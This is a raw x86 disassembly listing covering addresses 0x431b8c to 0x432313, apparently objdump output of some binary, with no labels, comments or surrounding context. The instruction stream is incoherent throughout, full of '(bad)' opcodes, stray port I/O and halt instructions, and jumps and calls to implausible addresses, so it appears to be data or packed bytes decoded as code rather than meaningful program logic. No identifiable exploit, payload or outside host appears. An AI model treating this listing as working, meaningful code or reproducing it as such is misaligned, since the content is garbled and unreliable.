  431b8c:	adc    BYTE PTR [ebx],al
  431b8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b9b:	dec    ebp
  431b9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ba2:	(bad)  
  431ba3:	iret   
  431ba4:	inc    ebp
  431ba5:	(bad)  
  431ba6:	jne    0x431bf5
  431ba8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bae:	(bad)  
  431baf:	cmp    ebx,eax
  431bb1:	je     0x431b39
  431bb3:	add    edi,edi
  431bb5:	or     bh,bh
  431bb7:	dec    ebp
  431bb8:	inc    ebp
  431bb9:	mov    esi,DWORD PTR [ebx]
  431bbb:	cld    
  431bbc:	add    ecx,esi
  431bbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431bc1:	mov    edx,DWORD PTR [edi]
  431bc3:	or     BYTE PTR [ebp-0x7c],al
  431bc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bcc:	test   BYTE PTR [ebx+ebx*4],cl
  431bcf:	inc    ebp
  431bd0:	xor    bh,BYTE PTR [esi]
  431bd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bd9:	jne    0x431ba2
  431bdb:	mov    ebp,esp
  431bdd:	fcomp  DWORD PTR [ebx]
  431bdf:	add    BYTE PTR [ecx],al
  431be1:	inc    DWORD PTR [ebp-0x75]
  431be4:	(bad)  
  431be5:	cld    
  431be6:	add    al,0xce
  431be8:	mov    ecx,edi
  431bea:	cld    
  431beb:	inc    ebp
  431bec:	fidivr WORD PTR [ebx]
  431bee:	fbstp  TBYTE PTR [ebp-0x3e]
  431bf1:	mov    eax,DWORD PTR [eax]
  431bf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431bf9:	fadd   st,st(7)
  431bfb:	add    BYTE PTR [ebp-0x1],al
  431bfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431c01:	inc    ebp
  431c02:	mov    bh,0xc7
  431c05:	loopne 0x431c4c
  431c07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c0d:	sbb    dh,BYTE PTR [ebx]
  431c0f:	pushf  
  431c10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c16:	mov    eax,edi
  431c18:	cwde   
  431c19:	inc    ebp
  431c1a:	inc    ebp
  431c1b:	jne    0x431ba8
  431c1d:	mov    esp,esp
  431c1f:	clc    
  431c20:	add    al,0x4d
  431c22:	mov    DWORD PTR [ebx],esi
  431c24:	or     al,0x33
  431c26:	inc    ebp
  431c27:	lea    ecx,[ebx-0x398d13fd]
  431c2d:	add    bh,al
  431c2f:	inc    ebp
  431c30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c37:	add    ebp,esp
  431c39:	shufps xmm1,xmm3,0xc7
  431c3d:	(bad)  
  431c3e:	jmp    0x74885767
  431c43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c49:	hlt    
  431c4a:	mov    ecx,DWORD PTR [edi]
  431c4c:	fadd   DWORD PTR [ebp+0x0]
  431c4f:	xor    ecx,DWORD PTR [edi]
  431c51:	add    ecx,ecx
  431c53:	cmp    edi,edi
  431c55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c59:	(bad)  
  431c5a:	jmp    0x431be7
  431c5c:	mov    edi,esp
  431c5e:	or     al,0xc6
  431c60:	inc    ebp
  431c61:	(bad)  
  431c62:	mov    eax,DWORD PTR [ebp+0x10]
  431c65:	jne    0x431bf0
  431c67:	mov    eax,DWORD PTR [ecx]
  431c69:	clc    
  431c6a:	add    BYTE PTR [ebp-0x40],cl
  431c6d:	xor    edx,DWORD PTR [eax-0x73]
  431c70:	jne    0x431c73
  431c72:	push   DWORD PTR [edx+0x8]
  431c75:	add    BYTE PTR [ebp+0x45],al
  431c78:	mov    ebp,ecx
  431c7a:	cld    
  431c7b:	add    BYTE PTR [ebp+0x0],cl
  431c7e:	xor    eax,DWORD PTR [ebp+0x3]
  431c81:	mov    DWORD PTR [ebx],edi
  431c83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c89:	sub    eax,0x5d330e4d
  431c8e:	lea    esi,[ebx]
  431c90:	add    DWORD PTR [ebx],eax
  431c92:	jb     0x431c7d
  431c94:	add    BYTE PTR [eax],al
  431c96:	inc    ebp
  431c97:	add    bl,ch
  431c99:	inc    ebp
  431c9a:	mov    esi,DWORD PTR [ebx]
  431c9c:	or     al,0x3
  431c9e:	(bad)  
  431c9f:	mov    edi,eax
  431ca1:	in     al,dx
  431ca2:	scas   eax,DWORD PTR es:[edi]
  431ca3:	inc    ebp
  431ca4:	mov    esi,DWORD PTR [ebx]
  431ca6:	in     al,0x3
  431ca8:	add    al,0x89
  431caa:	mov    ecx,DWORD PTR [eax+edi*8]
  431cad:	dec    ebp
  431cae:	(bad)  
  431caf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431cb6:	mov    ecx,eax
  431cb8:	cld    
  431cb9:	push   es
  431cba:	dec    ebp
  431cbb:	add    al,0x33
  431cbd:	mov    DWORD PTR [ebx],eax
  431cbf:	in     al,dx
  431cc0:	cmp    DWORD PTR [ebp-0x67],eax
  431cc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cc9:	mov    edx,DWORD PTR [ebp-0x4]
  431ccc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431ccf:	xor    eax,DWORD PTR [ebp+0x3]
  431cd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431cd8:	xor    edi,esp
  431cda:	jmp    0xff771a2c
  431cdf:	add    ecx,DWORD PTR [ebp-0x3f]
  431ce2:	xor    ebx,DWORD PTR [edi]
  431ce4:	add    eax,ecx
  431ce6:	cmp    ebx,DWORD PTR [eax]
  431ce8:	mov    ecx,DWORD PTR [ebp-0x4]
  431ceb:	mov    ecx,DWORD PTR [eax]
  431ced:	adc    BYTE PTR [ebp-0x80],al
  431cf0:	jmp    0x431cf3
  431cf2:	mov    eax,DWORD PTR [eax]
  431cf4:	cld    
  431cf5:	mov    bh,0xc6
  431cf7:	push   ecx
  431cf8:	(bad)  
  431cf9:	jne    0x431d59
  431cfb:	dec    ecx
  431cfd:	or     BYTE PTR [ecx+ebx*1],cl
  431d00:	push   ebp
  431d01:	inc    ebp
  431d02:	in     al,dx
  431d03:	add    ebp,esp
  431d05:	or     bh,al
  431d07:	dec    ebp
  431d08:	cld    
  431d09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d0f:	xor    DWORD PTR [edx],0x2
  431d12:	pushf  
  431d13:	dec    DWORD PTR [ebx+0x45510cf4]
  431d19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d1f:	mov    edx,DWORD PTR [ecx+0xc]
  431d22:	xor    eax,esi
  431d24:	mov    edx,0xc172c7
  431d29:	inc    ebp
  431d2a:	mov    esi,DWORD PTR [ebp+0x8]
  431d2d:	mov    eax,edx
  431d2f:	call   0x84c7e424
  431d34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d3a:	mov    ebp,eax
  431d3c:	or     BYTE PTR [eax],dl
  431d3e:	jo     0x431d8d
  431d40:	push   edi
  431d41:	xor    esi,DWORD PTR [ebp+0x3]
  431d44:	(bad)  
  431d45:	pmulhuw mm0,mm1
  431d48:	test   DWORD PTR [ebp-0x8],ecx
  431d4b:	mov    DWORD PTR [ebp-0x67],eax
  431d4e:	mov    eax,DWORD PTR [ebp-0x4]
  431d51:	xor    edi,DWORD PTR [ebp-0x73]
  431d54:	xor    eax,DWORD PTR [ebx]
  431d56:	xor    esi,DWORD PTR [edx+0x3]
  431d59:	add    BYTE PTR [ecx],bh
  431d5b:	inc    ebp
  431d5c:	(bad)  
  431d5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d63:	mov    DWORD PTR [eax],0x750f0004
  431d69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d6f:	lock add BYTE PTR [ebp+0x0],cl
  431d73:	mov    esi,DWORD PTR [ebp-0x18]
  431d76:	mov    ebp,edx
  431d78:	or     al,0x72
  431d7a:	ja     0x431d7c
  431d7c:	mov    edx,esi
  431d7e:	cld    
  431d7f:	(bad)  
  431d82:	cli    
  431d83:	mov    esi,DWORD PTR [ebp-0x4]
  431d86:	cmp    ecx,esi
  431d88:	bswap  edi
  431d8a:	(bad)
  431d8e:	mov    esi,DWORD PTR [ebp-0x4]
  431d91:	mov    esi,ecx
  431d93:	clc    
  431d94:	repnz add esi,DWORD PTR [ebp+0x45]
  431d98:	push   ebx
  431d99:	xor    eax,DWORD PTR [ebp+0x3]
  431d9c:	cmp    al,0x5f
  431d9e:	pushf  
  431d9f:	pop    ebx
  431da0:	jmp    0x431e67
  431da5:	mov    esi,DWORD PTR [ebp-0x7d]
  431da8:	xor    ebp,DWORD PTR [eax]
  431daa:	lea    eax,[ebp-0x8]
  431dad:	xor    edx,esi
  431daf:	pushf  
  431db0:	out    dx,eax
  431db1:	(bad)  
  431db2:	neg    eax
  431db4:	ins    DWORD PTR es:[edi],dx
  431db5:	test   esi,edi
  431db7:	clc    
  431db8:	pop    esp
  431db9:	inc    ebp
  431dba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dc0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431dc6:	add    cl,al
  431dc8:	jne    0x431d65
  431dca:	mov    esi,DWORD PTR [edx]
  431dcc:	in     al,dx
  431dcd:	push   esi
  431dce:	xor    BYTE PTR [ebp-0xe],dh
  431dd1:	add    edi,esi
  431dd3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dd9:	add    cl,bh
  431ddb:	mov    edi,DWORD PTR [ebp+0x8]
  431dde:	mov    DWORD PTR [ebp-0x14],esi
  431de1:	add    esi,DWORD PTR [ebp+0x3c]
  431de4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dea:	mov    ah,0x3e
  431dec:	fwait
  431ded:	pushf  
  431dee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431df4:	jne    0x431d81
  431df6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431df9:	icebp  
  431dfa:	icebp  
  431dfb:	shl    edx,0xf2
  431dfe:	(bad)  
  431dff:	mov    ah,0x16
  431e01:	push   eax
  431e02:	jne    0x431d97
  431e04:	mov    ecx,DWORD PTR [edi]
  431e06:	in     al,dx
  431e07:	jmp    0x431dfa
  431e09:	add    dl,dh
  431e0b:	mov    edi,esi
  431e0d:	or     al,0x8
  431e0f:	inc    ebp
  431e10:	jne    0x431e15
  431e12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e18:	ret    
  431e19:	or     bh,bh
  431e1b:	jge    0x431e05
  431e1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e23:	xor    edi,eax
  431e25:	add    esi,DWORD PTR [ebp-0x77]
  431e28:	mov    ebx,esp
  431e2a:	clc    
  431e2b:	neg    DWORD PTR [ebp-0x7c]
  431e2e:	xor    eax,DWORD PTR [eax]
  431e30:	cmp    eax,DWORD PTR [eax]
  431e32:	repz jne 0x431dca
  431e35:	xor    eax,DWORD PTR [ecx]
  431e37:	add    ebx,DWORD PTR [eax]
  431e39:	mov    DWORD PTR [ebp-0x8],eax
  431e3c:	mov    eax,edi
  431e3e:	cld    
  431e3f:	lock pop eax
  431e41:	test   DWORD PTR [ebx],esi
  431e43:	clc    
  431e44:	add    edx,DWORD PTR [edi-0x740bff77]
  431e4a:	fdivp  st(4),st
  431e4c:	test   ecx,esi
  431e4e:	(bad)  
  431e4f:	jnp    0x431e50
  431e51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e57:	jae    0x431de4
  431e59:	sub    edi,esp
  431e5b:	(bad)  
  431e5c:	shl    DWORD PTR [eax-0x3e],0x89
  431e60:	leave  
  431e61:	call   0x8198d56e
  431e66:	in     al,dx
  431e67:	(bad)  
  431e68:	in     al,dx
  431e69:	add    bh,al
  431e6b:	mov    esp,edi
  431e6d:	in     al,dx
  431e6e:	test   DWORD PTR [ebp-0x8],edi
  431e71:	mov    eax,DWORD PTR [ebp+0x2b]
  431e74:	xor    al,BYTE PTR [ebx]
  431e76:	pushf  
  431e77:	jnp    0x57321ab0
  431e7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e81:	loopne 0x431eb6
  431e83:	jne    0x431e40
  431e85:	mov    esi,DWORD PTR [edx-0x20]
  431e88:	add    BYTE PTR [ebp-0x3d],bh
  431e8b:	xor    eax,DWORD PTR [ebp-0x73]
  431e8e:	mov    edi,DWORD PTR [esi]
  431e90:	cld    
  431e91:	jb     0x431e59
  431e93:	add    bl,al
  431e95:	jne    0x431edc
  431e97:	mov    edx,DWORD PTR [edi-0x10]
  431e9a:	jge    0x431f19
  431e9c:	mov    esi,DWORD PTR [ebx]
  431e9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ea2:	xor    esi,DWORD PTR [ebp-0x77]
  431ea5:	mov    esi,eax
  431ea7:	lock inc ebp
  431ea9:	jge    0x431edc
  431eab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431eb2:	dec    ebp
  431eb3:	mov    esi,DWORD PTR [ebx]
  431eb5:	loopne 0x431e40
  431eb7:	jge    0x431eb1
  431eb9:	add    DWORD PTR [ebp-0x7d],eax
  431ebc:	icebp  
  431ebd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ec4:	dec    ebp
  431ec5:	hlt    
  431ec6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ec9:	mov    esi,esp
  431ecb:	in     al,0x45
  431ecd:	jge    0x431f0c
  431ecf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ed6:	dec    ebp
  431ed7:	push   esp
  431ed8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431ede:	inc    ebp
  431edf:	hlt    
  431ee0:	xor    DWORD PTR [ebp-0x61],esi
  431ee3:	mov    edi,DWORD PTR [eax+0xf19504]
  431ee9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431eed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ef0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ef4:	fistp  WORD PTR [ebx+0x0]
  431ef7:	inc    ebp
  431ef8:	mov    ebx,DWORD PTR [edi+0xc]
  431efb:	add    eax,eax
  431efd:	inc    ebp
  431efe:	test   BYTE PTR [ebx],dh
  431f00:	add    eax,DWORD PTR [ebx]
  431f02:	add    BYTE PTR [esi+0x45],bl
  431f05:	ret    0x85
  431f08:	jnp    0x5443a2d7
  431f0e:	inc    bp
  431f10:	inc    ebp
  431f11:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f17:	fdiv   QWORD PTR [ebx]
  431f19:	test   DWORD PTR [ecx+0x453bf8],edi
  431f1f:	push   ebx
  431f20:	add    edi,DWORD PTR [esi+0x708088b]
  431f26:	cmp    esi,eax
  431f28:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f2f:	mov    esp,edi
  431f31:	call   0x33ce6483
  431f36:	or     BYTE PTR [ebx],al
  431f38:	inc    ecx
  431f39:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f3f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f45:	lock add cl,al
  431f48:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f4f:	mov    ch,0x45
  431f51:	clc    
  431f52:	xor    eax,DWORD PTR [ebp+0x3]
  431f55:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f5b:	inc    ebp
  431f5c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f62:	mov    edi,eax
  431f64:	mov    eax,DWORD PTR [ebp+0x3c]
  431f67:	mov    ecx,DWORD PTR [eax]
  431f69:	hlt    
  431f6a:	inc    ebp
  431f6b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f72:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f78:	push   ebp
  431f79:	mov    edi,DWORD PTR [ebx]
  431f7b:	in     al,dx
  431f7c:	jne    0x431f3f
  431f7e:	mov    eax,DWORD PTR [ebp-0x28]
  431f81:	add    DWORD PTR [eax],0xe8058dec
  431f87:	clc    
  431f88:	mov    esi,DWORD PTR [edi-0x8]
  431f8b:	add    dh,dl
  431f8d:	rol    WORD PTR [ebp-0x1],cl
  431f91:	mov    edx,DWORD PTR [eax+0x8]
  431f94:	jne    0x431f56
  431f96:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f9d:	inc    ebp
  431f9e:	push   esp
  431f9f:	test   DWORD PTR [ecx+0xf],ecx
  431fa2:	sub    edx,esp
  431fa4:	add    eax,DWORD PTR [eax]
  431fa6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fb3:	mov    eax,DWORD PTR [ecx]
  431fb5:	and    BYTE PTR [eax],al
  431fb7:	cmp    al,0x10
  431fb9:	add    BYTE PTR [ebp+0x66],al
  431fbc:	inc    ecx
  431fbe:	push   esp
  431fbf:	add    dh,BYTE PTR [ebp+0x0]
  431fc2:	push   edx
  431fc3:	enterw 0xc1,0x4d
  431fc8:	mov    esp,DWORD PTR [esi+0x20]
  431fcb:	add    DWORD PTR [ecx-0x7b],eax
  431fce:	add    eax,DWORD PTR [ebx]
  431fd0:	str    WORD PTR [eax+0x45]
  431fd4:	lea    ecx,[ebx+0x45890801]
  431fda:	sbb    BYTE PTR [ebx],al
  431fdc:	dec    ebp
  431fdd:	cmp    al,0xf
  431fdf:	inc    ebp
  431fe0:	push   eax
  431fe1:	mov    esi,DWORD PTR [ebx]
  431fe3:	push   eax
  431fe4:	add    eax,eax
  431fe6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fed:	inc    ebp
  431fee:	add    BYTE PTR [ecx],dh
  431ff0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431ff7:	(bad)  
  431ff8:	mov    ebx,eax
  431ffa:	loopne 0x432041
  431ffc:	dec    ebp
  431ffd:	mov    ecx,DWORD PTR [edi]
  431fff:	cld    
  432000:	push   eax
  432001:	xchg   DWORD PTR [ebx],esi
  432003:	add    DWORD PTR [ebx],ebp
  432005:	add    BYTE PTR [ebx],ch
  432007:	or     BYTE PTR [ecx],bh
  432009:	dec    ecx
  43200a:	loopne 0x43200f
  43200c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432012:	push   ebp
  432013:	add    DWORD PTR [ebx+0x55100800],eax
  432019:	dec    ebp
  43201a:	jmp    0x431fa5
  43201c:	mov    esp,DWORD PTR [eax]
  43201e:	sbb    dl,dl
  432020:	inc    eax
  432021:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432027:	add    BYTE PTR [ebx+0x74528555],cl
  43202d:	push   ebp
  43202e:	div    DWORD PTR [ebx]
  432030:	and    eax,DWORD PTR [ebx]
  432032:	add    edx,DWORD PTR [edx-0x30]
  432035:	jno    0x431fc2
  432037:	inc    DWORD PTR [eax+eiz*1]
  43203a:	inc    ebp
  43203b:	push   eax
  43203c:	push   eax
  43203d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432043:	mov    edi,esp
  432045:	push   eax
  432046:	inc    ebp
  432047:	enter  0x458b,0x8
  43204b:	push   ecx
  43204c:	(bad)  
  43204d:	call   0x10d2a25
  432052:	pop    ss
  432053:	push   ebp
  432054:	mov    ecx,DWORD PTR [ebx+0x489408]
  43205a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432060:	push   ecx
  432061:	jo     0x43204b
  432063:	inc    DWORD PTR [edi]
  432065:	or     BYTE PTR [eax],al
  432067:	call   0xce27b1
  43206c:	fmul   QWORD PTR [ebp+0x55]
  43206f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432075:	mov    bh,0x8c
  432077:	adc    al,0x9b
  432079:	dec    esp
  43207a:	xor    bl,BYTE PTR [eax]
  43207c:	mov    ecx,DWORD PTR [ebp+0xc]
  43207f:	mov    eax,DWORD PTR [ebp-0x4]
  432082:	mov    esi,DWORD PTR [edi-0x3148f924]
  432088:	push   es
  432089:	retf   
  43208a:	mov    BYTE PTR [ebp-0x30],0x3b
  43208e:	inc    ebp
  43208f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432096:	retf   0x83fc
  432099:	into   
  43209a:	dec    ebp
  43209b:	retf   
  43209c:	mov    ecx,DWORD PTR [ebp-0x74]
  43209f:	mov    eax,DWORD PTR [eax]
  4320a1:	fdiv   QWORD PTR [ebx]
  4320a3:	mov    bh,0x3
  4320a5:	push   es
  4320a6:	mov    esi,ecx
  4320a8:	sbb    cl,dl
  4320aa:	dec    ebp
  4320ab:	sar    DWORD PTR [ebx],cl
  4320ad:	push   ebp
  4320ae:	jne    0x4320bf
  4320b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320b6:	lea    ebx,[eax]
  4320b8:	call   0xf4ccac7f
  4320bd:	sbb    dh,dl
  4320bf:	add    edx,ebx
  4320c1:	push   ebp
  4320c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320c8:	push   ecx
  4320c9:	mov    DWORD PTR [eax-0x30],edx
  4320cc:	test   DWORD PTR [edx],eax
  4320ce:	xadd   esp,esi
  4320d1:	pop    es
  4320d2:	add    cl,dl
  4320d4:	mov    eax,ecx
  4320d6:	or     al,0x45
  4320d8:	(bad)  
  4320d9:	push   eax
  4320da:	add    DWORD PTR [edx+0x0],eax
  4320dd:	add    ecx,DWORD PTR [ecx]
  4320df:	and    dh,cl
  4320e1:	call   0xc729b1
  4320e6:	add    DWORD PTR [ebp+0x0],edx
  4320e9:	mov    esp,DWORD PTR [ebp+0x18]
  4320ec:	add    BYTE PTR [eax+0x50],cl
  4320ef:	xor    eax,DWORD PTR [eax]
  4320f1:	add    esp,DWORD PTR [esi+0x3b]
  4320f4:	inc    ebp
  4320f5:	je     0x43207a
  4320f7:	push   ecx
  4320f8:	dec    BYTE PTR [ebp-0x77]
  4320fb:	add    eax,esi
  4320fd:	or     al,0x5e
  4320ff:	inc    eax
  432100:	add    BYTE PTR [ebx],al
  432102:	data16 and BYTE PTR [ebp+0x50],al
  432106:	sub    DWORD PTR [ecx],0xfffffff8
  432109:	add    BYTE PTR [ebp-0x75],ah
  43210c:	add    BYTE PTR [eax],bl
  43210e:	enter  0x894d,0x8b
  432112:	int3   
  432113:	loopne 0x4320d7
  432115:	rol    BYTE PTR [eax],0x33
  432118:	lea    cx,[ebp+0xa]
  43211c:	data16 jb 0x432164
  43211f:	add    BYTE PTR [ebx+0x44890855],cl
  432125:	sbb    ah,al
  432127:	inc    ebp
  432128:	cmp    al,0xf
  43212a:	add    BYTE PTR [edx+0x66],dl
  43212d:	xor    ecx,DWORD PTR [eax]
  43212f:	sub    eax,DWORD PTR [edx]
  432131:	mov    eax,DWORD PTR [eax]
  432133:	or     al,0x66
  432135:	ror    edx,cl
  432137:	dec    ebp
  432138:	inc    ebp
  432139:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43213f:	cld    
  432140:	or     BYTE PTR [edi+0x4501dd],dl
  432146:	ret    0xecce
  432149:	retf   
  43214a:	(bad)  
  43214b:	dec    ebp
  43214c:	mov    al,0x8b
  43214e:	loopne 0x432170
  432150:	cmp    ecx,DWORD PTR [edx]
  432152:	inc    ebp
  432153:	daa    
  432154:	loopne 0x4320dd
  432156:	in     al,dx
  432157:	add    edi,eax
  432159:	add    BYTE PTR [eax+0x3f52e155],bh
  43215f:	push   ebp
  432160:	inc    ebp
  432161:	xor    ebx,edx
  432163:	add    ebp,esp
  432165:	push   edx
  432166:	push   bp
  432168:	inc    ebp
  432169:	(bad)  
  43216a:	in     eax,dx
  43216b:	push   esp
  43216c:	(bad)  
  43216d:	inc    edx
  43216f:	sbb    al,0x33
  432171:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432178:	add    BYTE PTR [ebp+0x46],0x8b
  43217c:	jmp    0xf98b:0x100041c8
  432183:	xor    esi,DWORD PTR [edx+0x3]
  432186:	mov    ecx,DWORD PTR [edi]
  432188:	fmul   DWORD PTR [edx]
  43218a:	add    BYTE PTR [eax],al
  43218c:	lea    eax,[ebx-0x4700273c]
  432192:	add    al,0x4f
  432194:	pop    DWORD PTR [eax]
  432196:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43219c:	push   edx
  43219d:	inc    WORD PTR [ebp+0x8]
  4321a1:	mov    eax,0x514f4d
  4321a6:	(bad)
  4321aa:	add    al,al
  4321ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321b2:	test   DWORD PTR [esi+0x74],esp
  4321b5:	inc    ebp
  4321b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4321bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321c2:	or     dh,cl
  4321c4:	or     eax,0x8b8d5045
  4321c9:	inc    ebp
  4321ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4321d0:	jne    0x432205
  4321d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321d8:	add    DWORD PTR [ebx],eax
  4321da:	add    bh,bh
  4321dc:	adc    DWORD PTR [eax],ecx
  4321de:	adc    DWORD PTR [ebp+0x55],edi
  4321e1:	push   es
  4321e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321ef:	inc    ebp
  4321f0:	mov    esp,edi
  4321f2:	or     al,0xda
  4321f4:	push   eax
  4321f5:	(bad)  
  4321f6:	jne    0x4321ac
  4321f8:	call   0x3b1ae7
  4321fd:	inc    ebp
  4321fe:	sar    BYTE PTR [eax],0x84
  432201:	in     al,dx
  432202:	add    bh,al
  432204:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43220b:	(bad)  
  43220c:	and    al,al
  43220e:	fs in  eax,dx
  432210:	inc    DWORD PTR [ebp-0x7b]
  432213:	jle    0x432224
  432215:	leave  
  432216:	scas   al,BYTE PTR es:[edi]
  432217:	inc    esp
  432218:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43221f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432226:	call   DWORD PTR [edi]
  432228:	shr    ah,0x84
  43222b:	xchg   DWORD PTR [eax],eax
  43222d:	add    DWORD PTR [eax],eax
  43222f:	add    bh,bh
  432231:	dec    ebp
  432232:	and    BYTE PTR [ecx-0x38],dl
  432235:	push   eax
  432236:	dec    DWORD PTR [ebx+0xfd885]
  43223c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432242:	mov    WORD PTR [ecx+0x0],ss
  432245:	lea    ecx,[ebx+0x108b20d8]
  43224b:	mov    WORD PTR [edx],ds
  43224d:	add    BYTE PTR [edi+0xff01ff],al
  432253:	mov    ecx,DWORD PTR [ebp-0x28]
  432256:	push   ecx
  432257:	shl    BYTE PTR [ebp+0x3a],0x8b
  43225b:	inc    ebp
  43225c:	in     al,0xeb
  43225e:	jno    0x4321eb
  432260:	push   edx
  432261:	mov    DWORD PTR [eax-0x28],edx
  432264:	mov    eax,DWORD PTR [ebp+0x20]
  432267:	je     0x4321f0
  432269:	mov    eax,DWORD PTR [ecx]
  43226b:	sbb    BYTE PTR [eax],al
  43226d:	pop    DWORD PTR [eax]
  43226f:	add    esi,eax
  432271:	add    bl,al
  432273:	adc    DWORD PTR [edi],esi
  432275:	jmp    0x8bce72c7
  43227a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432281:	jne    0x43220e
  432283:	mov    ecx,DWORD PTR [eax]
  432285:	in     al,0x75
  432287:	pop    DWORD PTR [ecx+0x5401]
  43228d:	push   edx
  43228e:	inc    DWORD PTR [ebx]
  432290:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432296:	add    BYTE PTR [edi+0x9],dl
  432299:	call   DWORD PTR [esi]
  43229b:	and    dl,al
  43229d:	and    bh,bh
  43229f:	inc    edi
  4322a1:	test   eax,edx
  4322a3:	sldt   ebx
  4322a6:	xor    al,BYTE PTR [eax]
  4322a8:	pushf  
  4322a9:	(bad)  
  4322aa:	jmp    0x4322b8
  4322ac:	mov    eax,edi
  4322ae:	or     al,0x75
  4322b0:	inc    eax
  4322b1:	call   0x4319b9
  4322b6:	mov    eax,eax
  4322b8:	loopne 0x43223e
  4322ba:	inc    ebp
  4322bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322c1:	mov    eax,DWORD PTR [ebp+0x20]
  4322c4:	add    edi,ecx
  4322c6:	add    BYTE PTR [eax],ch
  4322c8:	cmp    edi,0x18
  4322cb:	test   DWORD PTR [ebp+0xf],esi
  4322ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322d5:	jne    0x4322d9
  4322d7:	call   0xffa21d9c
  4322dc:	leave  
  4322dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4322e1:	add    ah,ch
  4322e3:	add    BYTE PTR [edi-0x48fef979],dh
  4322e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322f0:	inc    esp
  4322f1:	mov    ebx,DWORD PTR [eax]
  4322f3:	fcom   st(2)
  4322f5:	add    BYTE PTR [edi],bl
  4322f7:	lea    ecx,[eax-0x18]
  4322fa:	(bad)  
  4322fb:	push   DWORD PTR [ecx]
  4322fd:	call   0xffb5705f
  432302:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432306:	fstp   DWORD PTR [esi+ebx*8]
  432309:	push   ebp
  43230a:	pop    ebp
  43230b:	mov    esi,DWORD PTR [edx-0x38]
  43230e:	add    DWORD PTR [eax],0x28
  432311:	mov    edi,DWORD PTR [ebx]
  432313:	xor    esi,DWORD PTR [edx+0x3]
